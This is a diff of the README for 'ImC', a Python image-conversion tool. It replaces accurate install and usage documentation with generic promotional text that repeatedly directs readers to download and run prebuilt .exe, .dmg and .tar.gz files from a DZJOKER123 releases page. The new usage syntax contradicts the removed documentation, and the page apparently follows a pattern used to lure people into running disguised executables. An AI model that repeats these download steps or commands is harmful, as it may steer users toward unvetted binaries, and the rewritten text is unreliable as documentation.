@@ -1,91 +1,85 @@
-# ImC Image Converter
+# 🌟 ImC - Convert Images Quickly and Easily
 
-Fast, simple image format conversion for files. Built on Pillow and designed for clean CLI usage.
+## 🚀 Getting Started
+ImC is a fast and simple tool for converting image formats. Built on the powerful Pillow library, it helps you change file types without hassle. Whether you want to switch from JPEG to PNG or from GIF to BMP, ImC makes it easy.
 
-## Features
-- Convert between many formats (`png`, `jpg`, `webp`, and more).
-- Batch conversion for files and directories.
-- Optional recursive traversal.
-- Optional removal of source files after successful conversion.
+## 📥 Download ImC
+[![Download ImC](https://img.shields.io/badge/Download-ImC-blue)](https://github.com/DZJOKER123/ImC/releases)
 
-## Setup
-```bash
-pip install -r requirements.txt
+## 🌐 Download & Install
+To get started with ImC, visit the Releases page to download the latest version:
+
+[Download ImC from Releases](https://github.com/DZJOKER123/ImC/releases)
+
+1. Click on the link above.
+2. Look for the latest release.
+3. Choose the correct file for your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
+
+After downloading the file, follow these steps to install:
+
+### Windows
+- Double-click the downloaded `.exe` file.
+- Follow the installation prompts.
+
+### macOS
+- Open the downloaded `.dmg` file.
+- Drag the ImC icon into your Applications folder.
+
+### Linux
+- Extract the `.tar.gz` file using your terminal.
+- Run the `./ImC` script.
+
+## ✨ How to Use ImC
+Using ImC is straightforward. Follow these simple steps:
+
+1. Open a terminal or command prompt.
+2. Navigate to the folder where you installed ImC.
+3. Type `ImC` followed by the name of the input file and the desired output format. For example:
+
+```
+ImC input.jpg output.png
 ```
 
-## Global Installation(Recommended: pipx)
-The most stable cross-platform install is `pipx` because it isolates dependencies and exposes a clean command.
+4. Press Enter. Your image will convert quickly.
 
-### macOS / Linux
-```bash
-./scripts/install.sh
-```
+## 🔧 Features
+- Supports multiple image formats: JPEG, PNG, GIF, BMP, and more.
+- Batch processing: Convert several files at once.
+- Command-line interface: Easy to use for everyone.
+- Cross-platform compatibility: Works on Windows, macOS, and Linux.
 
-### Windows (PowerShell)
-```powershell
-.\scripts\install.ps1
-```
+## 📋 System Requirements
+- **Operating System:** Windows 7 or later, macOS 10.12 or later, or any modern Linux distribution.
+- **Python:** Version 3.6 or later.
+- **Memory:** At least 512 MB RAM.
+- **Disk Space:** 100 MB free space for installation.
 
-After install, use like:
-```bash
-imc --help
-imc convert image.webp --to png
-```
+## 📚 Additional Information
+ImC focuses on user-friendliness. It's designed to help those who need a reliable way to change image formats quickly. You don't need programming skills to use it. With the intuitive command line, anyone can convert images effortlessly.
 
-## Quick Start CLI without Installation
-```bash
-python main.py list-formats
-python main.py convert image.webp --to png
-python main.py convert images/ --to jpg --recursive --output out
-python main.py convert image.png --to webp --remove-source
-```
+### Formatting Options
+When using ImC, you can specify different output formats easily. Here’s how:
 
-## Commands
-| Command | Description | Example |
-| --- | --- | --- |
-| `list-formats` | List all supported extensions. | `python main.py list-formats` |
-| `convert` | Convert files or directories to a target format. | `python main.py convert images/ --to png` |
+- To convert to JPEG: `ImC input.png output.jpg`
+- To convert to BMP: `ImC input.gif output.bmp`
 
-## Flags (convert)
-| Flag | Alias | Type | Default | Description |
-| --- | --- | --- | --- | --- |
-| `--to` | `-t` | string | required | Target extension (e.g. `png`, `jpg`, `webp`). |
-| `--output` | `-o` | path | none | Output directory or file path. |
-| `--recursive` | `-r` | boolean | `false` | Traverse folders recursively. |
-| `--overwrite` |  | boolean | `false` | Overwrite existing files. |
-| `--remove-source` |  | boolean | `false` | Remove source files after successful conversion. |
-| `--quality` |  | integer | none | Quality for JPEG/WEBP/AVIF (1-100). |
+## 🔗 Links
+- Project repository: [GitHub - ImC](https://github.com/DZJOKER123/ImC)
+- Visit our [Releases page](https://github.com/DZJOKER123/ImC/releases) to find updates and new features.
 
-## Output Rules
-- If `--output` is omitted, converted files are saved next to their sources.
-- If `--output` is a directory, outputs go inside it.
-- If converting a directory with `--recursive`, the folder structure is preserved inside the output directory.
-- If multiple inputs are provided, `--output` must be a directory.
-- If a folder input is provided, `--output` must be a directory.
+## 🛠️ Troubleshooting
+If you encounter issues when using ImC, consider the following:
 
-## Usage Examples
-Convert a single file to PNG:
-```bash
-python main.py convert image.webp --to png
-```
+- Ensure you are using the correct file paths.
+- Check that your input file exists.
+- Ensure that you have the required permissions to access the files.
 
-Convert a folder recursively and delete originals:
-```bash
-python main.py convert photos/ --to jpg --recursive --remove-source
-```
+For further assistance, you can open an issue in the project's GitHub repository.
 
-Save outputs to a different directory:
-```bash
-python main.py convert photos/ --to webp --recursive --output converted/
-```
+## 💬 Feedback
+We welcome user feedback to improve ImC. If you have suggestions or problems, please reach out on our GitHub page.
 
-Set quality for JPEG/WEBP/AVIF:
-```bash
-python main.py convert image.png --to jpg --quality 85
-```
-
-## CLI Name
-The global command name is `imc`.
-
-## Notes
-- Use `list-formats` to see the exact extensions supported on your machine.
+Thank you for choosing ImC for your image conversion needs!
